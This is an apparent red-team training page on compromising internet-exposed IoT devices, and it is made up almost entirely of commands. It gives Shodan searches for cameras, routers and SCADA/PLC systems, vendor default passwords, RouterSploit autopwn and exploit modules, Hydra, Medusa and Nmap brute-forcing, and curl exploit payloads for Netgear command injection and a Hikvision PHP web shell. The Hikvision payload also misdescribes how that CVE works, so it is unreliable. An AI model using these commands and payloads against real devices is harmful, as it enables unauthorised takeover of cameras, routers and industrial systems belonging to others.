---
layout: training-page
title: "Default Credentials & IoT Recon — Red Team Academy"
module: "IoT Hacking"
tags:
  - default-creds
  - shodan
  - routersploit
  - iot-recon
  - credential-stuffing
page_key: "iot-default-creds"
render_with_liquid: false
---

# Default Credentials & IoT Recon

IoT devices ship with default credentials that are rarely changed. Combined with Shodan to identify internet-exposed devices and RouterSploit for automated exploitation, default credentials provide quick wins against cameras, routers, PLCs, and industrial systems.

## Shodan Recon

```
# Create account: shodan.io (free tier: 1 export/month, limited results)
# CLI: pip3 install shodan && shodan init YOUR_API_KEY

# IP camera searches:
shodan search "Hikvision" port:8080
shodan search "title:webcam" port:80
shodan search "AXIS" port:80
shodan search "has_screenshot:true" port:80 product:camera
shodan search "GoAhead" has_screenshot:true

# Router searches:
shodan search "D-Link" port:8080 country:US
shodan search "TP-Link" http.title:"TL-"
shodan search "Netgear" "firmware"

# Industrial / SCADA:
shodan search "port:502" product:Modbus
shodan search "port:102" product:s7comm
shodan search "port:20000" product:dnp3
shodan search "Siemens SIMATIC" port:102

# Vulnerable device searches:
shodan search vuln:CVE-2018-10561   # GPON routers
shodan search vuln:CVE-2017-8225    # IP cameras
shodan search "GoAhead" port:8080   # many CVEs

# Download results (requires paid API):
shodan download results.json.gz "Hikvision port:8080"
shodan parse --fields ip_str,port,org results.json.gz

# Check single IP:
shodan host 1.2.3.4
```

## Default Credential Databases

```
# Online databases:
# https://www.defaultpassword.com/
# https://cirt.net/passwords
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/
# https://github.com/ihebski/DefaultCreds-cheat-sheet

# DefaultCreds-cheat-sheet (searchable):
git clone https://github.com/ihebski/DefaultCreds-cheat-sheet
pip3 install defaultcreds-cheat-sheet
creds search hikvision
creds search netgear
creds search cisco

# Common defaults by vendor:
# Hikvision cameras: admin:12345 or admin:(blank)
# Dahua cameras: admin:admin
# D-Link routers: admin:admin or admin:(blank)
# TP-Link: admin:admin or admin:(blank)
# Netgear: admin:password
# Cisco routers: cisco:cisco or admin:admin
# Linksys: admin:(blank)
# AXIS cameras: root:pass or root:root
# MikroTik: admin:(blank)
# Ubiquiti: ubnt:ubnt
```

## RouterSploit — Automated IoT Exploitation

```
# Install:
git clone https://github.com/threat9/routersploit
cd routersploit
pip3 install -r requirements.txt
python3 rsf.py

# RouterSploit commands:
use scanners/autopwn          # auto-detect and exploit vulnerabilities
set target 192.168.1.1
run

# Check default credentials for a target:
use creds/routers/router_scan  # try all router credential combos
set target 192.168.1.1
run

# Target-specific exploits:
use exploits/routers/dlink/dir_300_615_rce   # D-Link RCE
use exploits/routers/netgear/multi_rce       # Netgear RCE
use exploits/cameras/hikvision/unauth_access # Hikvision CVE

# Autopwn (scans + exploits):
use scanners/autopwn
set target 192.168.1.1
run
```

## Credential Spraying IoT Web Interfaces

```
# Identify web interface type from HTTP headers/title:
curl -I http://TARGET/ | grep -i "server\|www-auth"
curl -s http://TARGET/ | grep -i "title\|form\|login"

# Hydra for HTTP form brute force:
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form \
  "/login.cgi:username=^USER^&password=^PASS^:Invalid"

# HTTPx + ffuf for distributed credential spray:
echo "192.168.1.1" | httpx -title -status-code

# Nmap + NSE for default creds:
nmap --script http-default-accounts TARGET
nmap --script ftp-brute,ssh-brute,telnet-brute TARGET \
  --script-args userdb=users.txt,passdb=passwords.txt

# Medusa for SSH:
medusa -h TARGET -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# Telnet (many IoT devices still expose telnet on port 23):
telnet TARGET 23
# Try: admin/admin, root/root, root/(blank), admin/1234
```

## Specific CVEs for Common Devices

```
# Hikvision Authentication Bypass (CVE-2021-36260):
# Unauthenticated RCE via /SDK/webLanguage endpoint
curl -s -X PUT "http://TARGET/SDK/webLanguage" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '<?xml version="1.0" encoding="UTF-8"?><language><?php system($_GET["cmd"]); ?></language>'

# Netgear WNAP320 RCE:
curl "http://TARGET/boardData102.php?writeData=true&reginfo=0&macAddress=aabbcc;id;"

# D-Link DIR-615 Command Injection:
# POST /apply_sec.cgi with ping_ipaddr field

# TP-Link Archer A7 Command Injection (CVE-2021-41653):
# TDDP service remote code execution

# Check Exploit-DB for device-specific exploits:
searchsploit "netgear"
searchsploit "hikvision"
searchsploit "dlink" | grep RCE
```

## Resources

- Shodan — `shodan.io`
- DefaultCreds — `github.com/ihebski/DefaultCreds-cheat-sheet`
- RouterSploit — `github.com/threat9/routersploit`
- Censys — `censys.io` — alternative to Shodan
- FOFA — `fofa.info` — Chinese IoT search engine
- IoT Inspector — `iot-inspector.com`
